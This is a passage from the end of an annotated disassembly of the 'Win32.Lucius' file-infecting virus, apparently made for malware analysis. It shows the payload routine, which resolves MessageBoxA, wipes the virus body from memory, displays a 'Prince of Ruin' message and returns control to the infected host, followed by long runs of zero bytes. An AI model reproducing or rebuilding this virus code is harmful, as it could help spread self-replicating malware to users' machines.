.data:00403C0F                 db    0
.data:00403C10                 db    0
.data:00403C11                 db    0
.data:00403C12                 db    0
.data:00403C13                 db  2Ah ; *
.data:00403C14                 db  2Eh ; .
.data:00403C15                 db  65h ; e
.data:00403C16                 db  78h ; x
.data:00403C17                 db  65h ; e
.data:00403C18                 db    0
.data:00403C19                 db  2Eh ; .
.data:00403C1A                 db  2Eh ; .
.data:00403C1B                 db    0
.data:00403C1C                 db 0E4h
.data:00403C1D                 db  2Fh ; /
.data:00403C1E                 db  14h
.data:00403C1F                 db    0
.data:00403C20                 db  31h ; 1
.data:00403C21                 db  26h ; &
.data:00403C22                 db    0
.data:00403C23                 db    0
.data:00403C24                 db 0C0h
.data:00403C25                 db    1
.data:00403C26                 db  33h ; 3
.data:00403C27                 db    0
.data:00403C28 ; ---------------------------------------------------------------------------
.data:00403C28 ; START OF FUNCTION CHUNK FOR sub_403014
.data:00403C28
.data:00403C28 loc_403C28:                             ; CODE XREF: sub_403014+2F9↑j
.data:00403C28                 lea     eax, [ebp+401A84h] ; "user32" pushed to the stack as parameter
.data:00403C2E                 push    eax
.data:00403C2F                 mov     eax, [ebp+40177Ch] ; call LoadLibrary
.data:00403C35                 call    eax
.data:00403C37                 mov     [ebp+401BB5h], eax ; grab library address and store in mem
.data:00403C3D                 lea     esi, [ebp+40182Ch] ;  string "MessageBoxA" is set up to be searched
.data:00403C43                 call    searchForFunction
.data:00403C48                 mov     [ebp+401837h], eax ; "MessageBoxA"funcction call ptr stored in memory
.data:00403C4E                 push    0
.data:00403C50                 lea     eax, [ebp+401C67h] ; push pointer to "win32.lucius"asparameter
.data:00403C56                 push    eax
.data:00403C57                 lea     eax, [ebp+401C74h] ; push "...I am lucius, prince of ruin" string as caption to message box
.data:00403C5D                 push    eax
.data:00403C5E                 push    0               ; type of this message box with only "OK" button
.data:00403C60                 mov     eax, [ebp+401837h]
.data:00403C66                 push    eax             ; MessageBoxA function call ptr pushed on stack
.data:00403C67                 lea     edi, [ebp+401000h] ; loads the start address of the malware in edi
.data:00403C6D                 mov     ecx, 0C62h      ; ecx=number of bytes of malware to 0 out malware
.data:00403C72                 mov     al, 0           ; set al as 0 to zero out all bytes
.data:00403C74                 rep stosb               ; write 0 to all the bytes of the malware starting at malware's  beginning
.data:00403C76                 pop     eax             ; grab function call address
.data:00403C77                 call    eax             ; calls MessageBoxA with the Lucius text as parameter
.data:00403C77                                         ; Displays a modal dialog box that contains a system icon, a set of buttons, and a brief application-specific message, such as status or error information
.data:00403C79                 jmp     short loc_403CAA
.data:00403C79 ; END OF FUNCTION CHUNK FOR sub_403014
.data:00403C79 ; ---------------------------------------------------------------------------
.data:00403C7B aWin32Lucius    db 'Win32.Lucius',0
.data:00403C88 aIAmLuciusPrinc db '...I am Lucius, Prince of Ruin...',0
.data:00403CAA ; ---------------------------------------------------------------------------
.data:00403CAA ; START OF FUNCTION CHUNK FOR sub_403014
.data:00403CAA
.data:00403CAA loc_403CAA:                             ; CODE XREF: sub_403014+C65↑j
.data:00403CAA                 push    offset loc_40101A ; pushes the address initally call from host into eip
.data:00403CAF                 retn                    ; the stack returns to the way it was before Lucius and so the function call of initial function host wascalling on will simply continue without anymore cleaning up
.data:00403CAF ; END OF FUNCTION CHUNK FOR sub_403014
.data:00403CAF ; ---------------------------------------------------------------------------
.data:00403CB0                 db  0Fh
.data:00403CB1                 db 0C5h
.data:00403CB2                 db  15h
.data:00403CB3                 db    9
.data:00403CB4                 db  4Fh ; O
.data:00403CB5                 db  56h ; V
.data:00403CB6                 db  25h ; %
.data:00403CB7                 db  17h
.data:00403CB8                 db  7Dh ; }
.data:00403CB9                 db 0A3h
.data:00403CBA                 db 0A2h
.data:00403CBB                 db    8
.data:00403CBC                 db  4Ch ; L
.data:00403CBD                 db  51h ; Q
.data:00403CBE                 db 0E1h
.data:00403CBF                 db    4
.data:00403CC0                 db 0FAh
.data:00403CC1                 db  46h ; F
.data:00403CC2                 db  89h
.data:00403CC3                 db    7
.data:00403CC4                 db  28h ; (
.data:00403CC5                 db  5Dh ; ]
.data:00403CC6                 db  64h ; d
.data:00403CC7                 db  0Bh
.data:00403CC8                 db  5Ch ; \
.data:00403CC9                 db 0CAh
.data:00403CCA                 db  65h ; e
.data:00403CCB                 db    1
.data:00403CCC                 db  10h
.data:00403CCD                 db 0D9h
.data:00403CCE                 db  99h
.data:00403CCF                 db    7
.data:00403CD0                 db  2Dh ; -
.data:00403CD1                 db 0CBh
.data:00403CD2                 db  79h ; y
.data:00403CD3                 db    5
.data:00403CD4                 db 0B3h
.data:00403CD5                 db    6
.data:00403CD6                 db 0ADh
.data:00403CD7                 db  0Ah
.data:00403CD8                 db  3Ch ; <
.data:00403CD9                 db 0B5h
.data:00403CDA                 db  7Bh ; {
.data:00403CDB                 db    8
.data:00403CDC                 db 0B1h
.data:00403CDD                 db  7Bh ; {
.data:00403CDE                 db 0FDh
.data:00403CDF                 db    8
.data:00403CE0                 db    2
.data:00403CE1                 db  21h ; !
.data:00403CE2                 db  38h ; 8
.data:00403CE3                 db  0Bh
.data:00403CE4                 db  44h ; D
.data:00403CE5                 db  33h ; 3
.data:00403CE6                 db  5Ch ; \
.data:00403CE7                 db    6
.data:00403CE8                 db 0A4h
.data:00403CE9                 db 0FFh
.data:00403CEA                 db  86h
.data:00403CEB                 db    3
.data:00403CEC                 db    0
.data:00403CED                 db  8Dh
.data:00403CEE                 db  56h ; V
.data:00403CEF                 db    8
.data:00403CF0                 db  7Ah ; z
.data:00403CF1                 db    0
.data:00403CF2                 db  89h
.data:00403CF3                 db    1
.data:00403CF4                 db    0
.data:00403CF5                 db    0
.data:00403CF6                 db    0
.data:00403CF7                 db    0
.data:00403CF8                 db    0
.data:00403CF9                 db    0
.data:00403CFA                 db    0
.data:00403CFB                 db    0
.data:00403CFC                 db    0
.data:00403CFD                 db    0
.data:00403CFE                 db    0
.data:00403CFF                 db    0
.data:00403D00                 db    0
.data:00403D01                 db    0
.data:00403D02                 db    0
.data:00403D03                 db    0
.data:00403D04                 db    0
.data:00403D05                 db    0
.data:00403D06                 db    0
.data:00403D07                 db    0
.data:00403D08                 db    0
.data:00403D09                 db    0
.data:00403D0A                 db    0
.data:00403D0B                 db    0
.data:00403D0C                 db    0
.data:00403D0D                 db    0
.data:00403D0E                 db    0
.data:00403D0F                 db    0
.data:00403D10                 db    0
.data:00403D11                 db    0
.data:00403D12                 db    0
.data:00403D13                 db    0
.data:00403D14                 db    0
.data:00403D15                 db    0
.data:00403D16                 db    0
.data:00403D17                 db    0
.data:00403D18                 db    0
.data:00403D19                 db    0
.data:00403D1A                 db    0
.data:00403D1B                 db    0
.data:00403D1C                 db    0
.data:00403D1D                 db    0
.data:00403D1E                 db    0
.data:00403D1F                 db    0
.data:00403D20                 db    0
.data:00403D21                 db    0
.data:00403D22                 db    0
.data:00403D23                 db    0
.data:00403D24                 db    0
.data:00403D25                 db    0
.data:00403D26                 db    0
.data:00403D27                 db    0
.data:00403D28                 db    0
.data:00403D29                 db    0
.data:00403D2A                 db    0
.data:00403D2B                 db    0
.data:00403D2C                 db    0
.data:00403D2D                 db    0
.data:00403D2E                 db    0
.data:00403D2F                 db    0
.data:00403D30                 db    0
.data:00403D31                 db    0
.data:00403D32                 db    0
.data:00403D33                 db    0
.data:00403D34                 db    0
.data:00403D35                 db    0
.data:00403D36                 db    0
.data:00403D37                 db    0
.data:00403D38                 db    0
.data:00403D39                 db    0
.data:00403D3A                 db    0
.data:00403D3B                 db    0
.data:00403D3C                 db    0
.data:00403D3D                 db    0
.data:00403D3E                 db    0
.data:00403D3F                 db    0
.data:00403D40                 db    0
.data:00403D41                 db    0
.data:00403D42                 db    0
.data:00403D43                 db    0
.data:00403D44                 db    0
.data:00403D45                 db    0
.data:00403D46                 db    0
.data:00403D47                 db    0
.data:00403D48                 db    0
.data:00403D49                 db    0
.data:00403D4A                 db    0
.data:00403D4B                 db    0
.data:00403D4C                 db    0
.data:00403D4D                 db    0
.data:00403D4E                 db    0
.data:00403D4F                 db    0
.data:00403D50                 db    0
.data:00403D51                 db    0
.data:00403D52                 db    0
.data:00403D53                 db    0
.data:00403D54                 db    0
.data:00403D55                 db    0
.data:00403D56                 db    0
.data:00403D57                 db    0
.data:00403D58                 db    0
.data:00403D59                 db    0
.data:00403D5A                 db    0
.data:00403D5B                 db    0
.data:00403D5C                 db    0
.data:00403D5D                 db    0
.data:00403D5E                 db    0
.data:00403D5F                 db    0
.data:00403D60                 db    0
.data:00403D61                 db    0
.data:00403D62                 db    0
.data:00403D63                 db    0
.data:00403D64                 db    0
.data:00403D65                 db    0
.data:00403D66                 db    0
.data:00403D67                 db    0
.data:00403D68                 db    0
.data:00403D69                 db    0
.data:00403D6A                 db    0
.data:00403D6B                 db    0
.data:00403D6C                 db    0
.data:00403D6D                 db    0
.data:00403D6E                 db    0
.data:00403D6F                 db    0
.data:00403D70                 db    0
.data:00403D71                 db    0
.data:00403D72                 db    0
.data:00403D73                 db    0
.data:00403D74                 db    0
.data:00403D75                 db    0
.data:00403D76                 db    0
.data:00403D77                 db    0
.data:00403D78                 db    0
.data:00403D79                 db    0
.data:00403D7A                 db    0
.data:00403D7B                 db    0
.data:00403D7C                 db    0
.data:00403D7D                 db    0
.data:00403D7E                 db    0
.data:00403D7F                 db    0
.data:00403D80                 db    0
.data:00403D81                 db    0
.data:00403D82                 db    0
.data:00403D83                 db    0
.data:00403D84                 db    0
.data:00403D85                 db    0
.data:00403D86                 db    0
.data:00403D87                 db    0
.data:00403D88                 db    0
.data:00403D89                 db    0
.data:00403D8A                 db    0
.data:00403D8B                 db    0
.data:00403D8C                 db    0
.data:00403D8D                 db    0
.data:00403D8E                 db    0
.data:00403D8F                 db    0
.data:00403D90                 db    0
.data:00403D91                 db    0
.data:00403D92                 db    0
.data:00403D93                 db    0
.data:00403D94                 db    0
.data:00403D95                 db    0
.data:00403D96                 db    0
.data:00403D97                 db    0
.data:00403D98                 db    0
.data:00403D99                 db    0
.data:00403D9A                 db    0
.data:00403D9B                 db    0
.data:00403D9C                 db    0
.data:00403D9D                 db    0
.data:00403D9E                 db    0
.data:00403D9F                 db    0
.data:00403DA0                 db    0
.data:00403DA1                 db    0
.data:00403DA2                 db    0
.data:00403DA3                 db    0
.data:00403DA4                 db    0
.data:00403DA5                 db    0
.data:00403DA6                 db    0
.data:00403DA7                 db    0
.data:00403DA8                 db    0
.data:00403DA9                 db    0
.data:00403DAA                 db    0
.data:00403DAB                 db    0
.data:00403DAC                 db    0
.data:00403DAD                 db    0
.data:00403DAE                 db    0
.data:00403DAF                 db    0
.data:00403DB0                 db    0
.data:00403DB1                 db    0
.data:00403DB2                 db    0
.data:00403DB3                 db    0
.data:00403DB4                 db    0
.data:00403DB5                 db    0
.data:00403DB6                 db    0
.data:00403DB7                 db    0
.data:00403DB8                 db    0
.data:00403DB9                 db    0
.data:00403DBA                 db    0
.data:00403DBB                 db    0
.data:00403DBC                 db    0
.data:00403DBD                 db    0
.data:00403DBE                 db    0
.data:00403DBF                 db    0
.data:00403DC0                 db    0
.data:00403DC1                 db    0
.data:00403DC2                 db    0
.data:00403DC3                 db    0
.data:00403DC4                 db    0
.data:00403DC5                 db    0
.data:00403DC6                 db    0
.data:00403DC7                 db    0
.data:00403DC8                 db    0
.data:00403DC9                 db    0
.data:00403DCA                 db    0
.data:00403DCB                 db    0
.data:00403DCC                 db    0
.data:00403DCD                 db    0
.data:00403DCE                 db    0
.data:00403DCF                 db    0
.data:00403DD0                 db    0
.data:00403DD1                 db    0
.data:00403DD2                 db    0
.data:00403DD3                 db    0
.data:00403DD4                 db    0
.data:00403DD5                 db    0
.data:00403DD6                 db    0
.data:00403DD7                 db    0
.data:00403DD8                 db    0
.data:00403DD9                 db    0
.data:00403DDA                 db    0
.data:00403DDB                 db    0
.data:00403DDC                 db    0
.data:00403DDD                 db    0
.data:00403DDE                 db    0
.data:00403DDF                 db    0
.data:00403DE0                 db    0
.data:00403DE1                 db    0
.data:00403DE2                 db    0
.data:00403DE3                 db    0
.data:00403DE4                 db    0
.data:00403DE5                 db    0
.data:00403DE6                 db    0
.data:00403DE7                 db    0
.data:00403DE8                 db    0
.data:00403DE9                 db    0
.data:00403DEA                 db    0
.data:00403DEB                 db    0
.data:00403DEC                 db    0
.data:00403DED                 db    0
.data:00403DEE                 db    0
.data:00403DEF                 db    0
.data:00403DF0                 db    0
.data:00403DF1                 db    0
.data:00403DF2                 db    0
.data:00403DF3                 db    0
.data:00403DF4                 db    0
.data:00403DF5                 db    0
.data:00403DF6                 db    0
.data:00403DF7                 db    0
.data:00403DF8                 db    0
.data:00403DF9                 db    0
.data:00403DFA                 db    0
.data:00403DFB                 db    0
.data:00403DFC                 db    0
.data:00403DFD                 db    0
.data:00403DFE                 db    0
.data:00403DFF                 db    0
.data:00403E00                 db    0
.data:00403E01                 db    0
.data:00403E02                 db    0
.data:00403E03                 db    0
.data:00403E04                 db    0
.data:00403E05                 db    0
.data:00403E06                 db    0
.data:00403E07                 db    0
.data:00403E08                 db    0
.data:00403E09                 db    0
.data:00403E0A                 db    0
.data:00403E0B                 db    0
.data:00403E0C                 db    0
.data:00403E0D                 db    0
.data:00403E0E                 db    0
.data:00403E0F                 db    0
.data:00403E10                 db    0
.data:00403E11                 db    0
.data:00403E12                 db    0
.data:00403E13                 db    0
.data:00403E14                 db    0
.data:00403E15                 db    0
.data:00403E16                 db    0
.data:00403E17                 db    0
.data:00403E18                 db    0
.data:00403E19                 db    0
.data:00403E1A                 db    0
.data:00403E1B                 db    0
.data:00403E1C                 db    0
.data:00403E1D                 db    0
.data:00403E1E                 db    0
.data:00403E1F                 db    0
.data:00403E20                 db    0
.data:00403E21                 db    0
.data:00403E22                 db    0
.data:00403E23                 db    0
.data:00403E24                 db    0
.data:00403E25                 db    0
.data:00403E26                 db    0
.data:00403E27                 db    0
.data:00403E28                 db    0
.data:00403E29                 db    0
.data:00403E2A                 db    0
.data:00403E2B                 db    0
.data:00403E2C                 db    0
.data:00403E2D                 db    0
.data:00403E2E                 db    0
.data:00403E2F                 db    0
.data:00403E30                 db    0
.data:00403E31                 db    0
.data:00403E32                 db    0
.data:00403E33                 db    0
.data:00403E34                 db    0
.data:00403E35                 db    0
.data:00403E36                 db    0
.data:00403E37                 db    0
.data:00403E38                 db    0
.data:00403E39                 db    0
.data:00403E3A                 db    0
.data:00403E3B                 db    0
.data:00403E3C                 db    0
.data:00403E3D                 db    0
.data:00403E3E                 db    0
.data:00403E3F                 db    0
.data:00403E40                 db    0
.data:00403E41                 db    0
.data:00403E42                 db    0
.data:00403E43                 db    0
.data:00403E44                 db    0
.data:00403E45                 db    0
.data:00403E46                 db    0
.data:00403E47                 db    0
.data:00403E48                 db    0
.data:00403E49                 db    0
.data:00403E4A                 db    0
.data:00403E4B                 db    0
.data:00403E4C                 db    0
.data:00403E4D                 db    0
.data:00403E4E                 db    0
.data:00403E4F                 db    0
.data:00403E50                 db    0
.data:00403E51                 db    0
.data:00403E52                 db    0
.data:00403E53                 db    0
.data:00403E54                 db    0
.data:00403E55                 db    0
.data:00403E56                 db    0
.data:00403E57                 db    0
.data:00403E58                 db    0
.data:00403E59                 db    0
.data:00403E5A                 db    0
.data:00403E5B                 db    0
.data:00403E5C                 db    0
.data:00403E5D                 db    0
.data:00403E5E                 db    0
.data:00403E5F                 db    0
.data:00403E60                 db    0
.data:00403E61                 db    0
.data:00403E62                 db    0
.data:00403E63                 db    0
.data:00403E64                 db    0
.data:00403E65                 db    0
.data:00403E66                 db    0
.data:00403E67                 db    0
.data:00403E68                 db    0
.data:00403E69                 db    0
.data:00403E6A                 db    0
.data:00403E6B                 db    0
.data:00403E6C                 db    0
.data:00403E6D                 db    0
.data:00403E6E                 db    0
.data:00403E6F                 db    0
.data:00403E70                 db    0
.data:00403E71                 db    0
.data:00403E72                 db    0
.data:00403E73                 db    0
.data:00403E74                 db    0
.data:00403E75                 db    0
.data:00403E76                 db    0
.data:00403E77                 db    0
.data:00403E78                 db    0
.data:00403E79                 db    0
.data:00403E7A                 db    0
.data:00403E7B                 db    0
.data:00403E7C                 db    0
.data:00403E7D                 db    0
.data:00403E7E                 db    0
.data:00403E7F                 db    0
.data:00403E80                 db    0
.data:00403E81                 db    0
.data:00403E82                 db    0
.data:00403E83                 db    0
.data:00403E84                 db    0
.data:00403E85                 db    0
.data:00403E86                 db    0
.data:00403E87                 db    0
.data:00403E88                 db    0
.data:00403E89                 db    0
.data:00403E8A                 db    0
.data:00403E8B                 db    0
.data:00403E8C                 db    0
.data:00403E8D                 db    0
.data:00403E8E                 db    0
.data:00403E8F                 db    0
.data:00403E90                 db    0
.data:00403E91                 db    0
.data:00403E92                 db    0
.data:00403E93                 db    0
.data:00403E94                 db    0
.data:00403E95                 db    0
.data:00403E96                 db    0
.data:00403E97                 db    0
.data:00403E98                 db    0
.data:00403E99                 db    0
.data:00403E9A                 db    0
.data:00403E9B                 db    0
.data:00403E9C                 db    0
.data:00403E9D                 db    0
.data:00403E9E                 db    0
.data:00403E9F                 db    0
.data:00403EA0                 db    0
.data:00403EA1                 db    0
.data:00403EA2                 db    0
.data:00403EA3                 db    0
.data:00403EA4                 db    0
.data:00403EA5                 db    0
.data:00403EA6                 db    0
.data:00403EA7                 db    0
.data:00403EA8                 db    0
.data:00403EA9                 db    0
.data:00403EAA                 db    0
.data:00403EAB                 db    0
.data:00403EAC                 db    0
.data:00403EAD                 db    0
.data:00403EAE                 db    0
.data:00403EAF                 db    0
.data:00403EB0                 db    0
.data:00403EB1                 db    0
.data:00403EB2                 db    0
.data:00403EB3                 db    0
.data:00403EB4                 db    0
.data:00403EB5                 db    0
.data:00403EB6                 db    0
.data:00403EB7                 db    0
.data:00403EB8                 db    0
.data:00403EB9                 db    0
.data:00403EBA                 db    0
.data:00403EBB                 db    0
.data:00403EBC                 db    0
.data:00403EBD                 db    0
.data:00403EBE                 db    0
.data:00403EBF                 db    0
.data:00403EC0                 db    0
.data:00403EC1                 db    0
.data:00403EC2                 db    0
.data:00403EC3                 db    0
.data:00403EC4                 db    0
.data:00403EC5                 db    0
.data:00403EC6                 db    0
.data:00403EC7                 db    0
.data:00403EC8                 db    0
.data:00403EC9                 db    0
.data:00403ECA                 db    0
.data:00403ECB                 db    0
.data:00403ECC                 db    0
.data:00403ECD                 db    0
.data:00403ECE                 db    0
.data:00403ECF                 db    0
.data:00403ED0                 db    0
.data:00403ED1                 db    0
.data:00403ED2                 db    0
.data:00403ED3                 db    0
.data:00403ED4                 db    0
.data:00403ED5                 db    0
.data:00403ED6                 db    0
.data:00403ED7                 db    0
.data:00403ED8                 db    0
.data:00403ED9                 db    0
.data:00403EDA                 db    0
.data:00403EDB                 db    0
.data:00403EDC                 db    0
.data:00403EDD                 db    0
.data:00403EDE                 db    0
.data:00403EDF                 db    0
.data:00403EE0                 db    0
.data:00403EE1                 db    0
.data:00403EE2                 db    0
.data:00403EE3                 db    0
.data:00403EE4                 db    0
.data:00403EE5                 db    0
.data:00403EE6                 db    0
.data:00403EE7                 db    0
.data:00403EE8                 db    0
.data:00403EE9                 db    0
.data:00403EEA                 db    0
.data:00403EEB                 db    0
.data:00403EEC                 db    0
.data:00403EED                 db    0
.data:00403EEE                 db    0
.data:00403EEF                 db    0
.data:00403EF0                 db    0
.data:00403EF1                 db    0
.data:00403EF2                 db    0
.data:00403EF3                 db    0
.data:00403EF4                 db    0
.data:00403EF5                 db    0
.data:00403EF6                 db    0
.data:00403EF7                 db    0
.data:00403EF8                 db    0
.data:00403EF9                 db    0
.data:00403EFA                 db    0
.data:00403EFB                 db    0
.data:00403EFC                 db    0
.data:00403EFD                 db    0
.data:00403EFE                 db    0
.data:00403EFF                 db    0
.data:00403F00                 db    0
.data:00403F01                 db    0
.data:00403F02                 db    0
.data:00403F03                 db    0
.data:00403F04                 db    0
.data:00403F05                 db    0
.data:00403F06                 db    0
.data:00403F07                 db    0
.data:00403F08                 db    0
.data:00403F09                 db    0
.data:00403F0A                 db    0
.data:00403F0B                 db    0
.data:00403F0C                 db    0
.data:00403F0D                 db    0
.data:00403F0E                 db    0
.data:00403F0F                 db    0
.data:00403F10                 db    0
.data:00403F11                 db    0
.data:00403F12                 db    0
.data:00403F13                 db    0
.data:00403F14                 db    0
.data:00403F15                 db    0
.data:00403F16                 db    0
.data:00403F17                 db    0
.data:00403F18                 db    0
.data:00403F19                 db    0
.data:00403F1A                 db    0
.data:00403F1B                 db    0
.data:00403F1C                 db    0
.data:00403F1D                 db    0
.data:00403F1E                 db    0
.data:00403F1F                 db    0
.data:00403F20                 db    0
.data:00403F21                 db    0
.data:00403F22                 db    0
.data:00403F23                 db    0
.data:00403F24                 db    0
.data:00403F25                 db    0
.data:00403F26                 db    0
.data:00403F27                 db    0
.data:00403F28                 db    0
.data:00403F29                 db    0
.data:00403F2A                 db    0
.data:00403F2B                 db    0
.data:00403F2C                 db    0
.data:00403F2D                 db    0
.data:00403F2E                 db    0
.data:00403F2F                 db    0
.data:00403F30                 db    0
.data:00403F31                 db    0
.data:00403F32                 db    0
.data:00403F33                 db    0
.data:00403F34                 db    0
.data:00403F35                 db    0
.data:00403F36                 db    0
.data:00403F37                 db    0
.data:00403F38                 db    0
.data:00403F39                 db    0
.data:00403F3A                 db    0
.data:00403F3B                 db    0
.data:00403F3C                 db    0
.data:00403F3D                 db    0
.data:00403F3E                 db    0
.data:00403F3F                 db    0
.data:00403F40                 db    0
.data:00403F41                 db    0
.data:00403F42                 db    0
.data:00403F43                 db    0
.data:00403F44                 db    0
.data:00403F45                 db    0
.data:00403F46                 db    0
.data:00403F47                 db    0
.data:00403F48                 db    0
.data:00403F49                 db    0
.data:00403F4A                 db    0
.data:00403F4B                 db    0
.data:00403F4C                 db    0
.data:00403F4D                 db    0
.data:00403F4E                 db    0
.data:00403F4F                 db    0
.data:00403F50                 db    0
.data:00403F51                 db    0
.data:00403F52                 db    0
.data:00403F53                 db    0
.data:00403F54                 db    0
.data:00403F55                 db    0
.data:00403F56                 db    0
.data:00403F57                 db    0
.data:00403F58                 db    0
.data:00403F59                 db    0
.data:00403F5A                 db    0
.data:00403F5B                 db    0
.data:00403F5C                 db    0
.data:00403F5D                 db    0
.data:00403F5E                 db    0
.data:00403F5F                 db    0
.data:00403F60                 db    0
.data:00403F61                 db    0
.data:00403F62                 db    0
.data:00403F63                 db    0
.data:00403F64                 db    0
.data:00403F65                 db    0
.data:00403F66                 db    0
.data:00403F67                 db    0
.data:00403F68                 db    0
.data:00403F69                 db    0
.data:00403F6A                 db    0
.data:00403F6B                 db    0
.data:00403F6C                 db    0
.data:00403F6D                 db    0
.data:00403F6E                 db    0
.data:00403F6F                 db    0
.data:00403F70                 db    0
.data:00403F71                 db    0
.data:00403F72                 db    0
.data:00403F73                 db    0
.data:00403F74                 db    0
.data:00403F75                 db    0
.data:00403F76                 db    0
.data:00403F77                 db    0
.data:00403F78                 db    0
.data:00403F79                 db    0
.data:00403F7A                 db    0
.data:00403F7B                 db    0
.data:00403F7C                 db    0
.data:00403F7D                 db    0
.data:00403F7E                 db    0
.data:00403F7F                 db    0
.data:00403F80                 db    0
.data:00403F81                 db    0
.data:00403F82                 db    0
.data:00403F83                 db    0
.data:00403F84                 db    0
.data:00403F85                 db    0
.data:00403F86                 db    0
.data:00403F87                 db    0
.data:00403F88                 db    0
.data:00403F89                 db    0
.data:00403F8A                 db    0
.data:00403F8B                 db    0
.data:00403F8C                 db    0
.data:00403F8D                 db    0
.data:00403F8E                 db    0
.data:00403F8F                 db    0
.data:00403F90                 db    0
.data:00403F91                 db    0
.data:00403F92                 db    0
.data:00403F93                 db    0
.data:00403F94                 db    0
.data:00403F95                 db    0
.data:00403F96                 db    0
.data:00403F97                 db    0
.data:00403F98                 db    0
.data:00403F99                 db    0
.data:00403F9A                 db    0
.data:00403F9B                 db    0
.data:00403F9C                 db    0
.data:00403F9D                 db    0
.data:00403F9E                 db    0
.data:00403F9F                 db    0
.data:00403FA0                 db    0
.data:00403FA1                 db    0
.data:00403FA2                 db    0
.data:00403FA3                 db    0
.data:00403FA4                 db    0
.data:00403FA5                 db    0
.data:00403FA6                 db    0
.data:00403FA7                 db    0
.data:00403FA8                 db    0
.data:00403FA9                 db    0
.data:00403FAA                 db    0
.data:00403FAB                 db    0
.data:00403FAC                 db    0
.data:00403FAD                 db    0
.data:00403FAE                 db    0
.data:00403FAF                 db    0
.data:00403FB0                 db    0
.data:00403FB1                 db    0
.data:00403FB2                 db    0
.data:00403FB3                 db    0
.data:00403FB4                 db    0
.data:00403FB5                 db    0
.data:00403FB6                 db    0
.data:00403FB7                 db    0
.data:00403FB8                 db    0
.data:00403FB9                 db    0
.data:00403FBA                 db    0
.data:00403FBB                 db    0
.data:00403FBC                 db    0
.data:00403FBD                 db    0
.data:00403FBE                 db    0
.data:00403FBF                 db    0
.data:00403FC0                 db    0
.data:00403FC1                 db    0
.data:00403FC2                 db    0
.data:00403FC3                 db    0
.data:00403FC4                 db    0
.data:00403FC5                 db    0
.data:00403FC6                 db    0
.data:00403FC7                 db    0
.data:00403FC8                 db    0
.data:00403FC9                 db    0
.data:00403FCA                 db    0
.data:00403FCB                 db    0
.data:00403FCC                 db    0
.data:00403FCD                 db    0
.data:00403FCE                 db    0
.data:00403FCF                 db    0
.data:00403FD0                 db    0
.data:00403FD1                 db    0
.data:00403FD2                 db    0
.data:00403FD3                 db    0
.data:00403FD4                 db    0
.data:00403FD5                 db    0
.data:00403FD6                 db    0
.data:00403FD7                 db    0
.data:00403FD8                 db    0
.data:00403FD9                 db    0
.data:00403FDA                 db    0
.data:00403FDB                 db    0
.data:00403FDC                 db    0
.data:00403FDD                 db    0
.data:00403FDE                 db    0
.data:00403FDF                 db    0
.data:00403FE0                 db    0
.data:00403FE1                 db    0
.data:00403FE2                 db    0
.data:00403FE3                 db    0
.data:00403FE4                 db    0
.data:00403FE5                 db    0
.data:00403FE6                 db    0
.data:00403FE7                 db    0
.data:00403FE8                 db    0
.data:00403FE9                 db    0
.data:00403FEA                 db    0
.data:00403FEB                 db    0
.data:00403FEC                 db    0
.data:00403FED                 db    0
.data:00403FEE                 db    0
.data:00403FEF                 db    0
.data:00403FF0                 db    0
.data:00403FF1                 db    0
.data:00403FF2                 db    0
.data:00403FF3                 db    0
.data:00403FF4                 db    0
.data:00403FF5                 db    0
.data:00403FF6                 db    0
.data:00403FF7                 db    0
.data:00403FF8                 db    0
.data:00403FF9                 db    0
.data:00403FFA                 db    0
.data:00403FFB                 db    0
.data:00403FFC                 db    0
.data:00403FFD                 db    0
.data:00403FFE                 db    0
.data:00403FFF                 db    0
.data:00403FFF _data           ends
.data:00403FFF
.data:00403FFF
.data:00403FFF                 end start
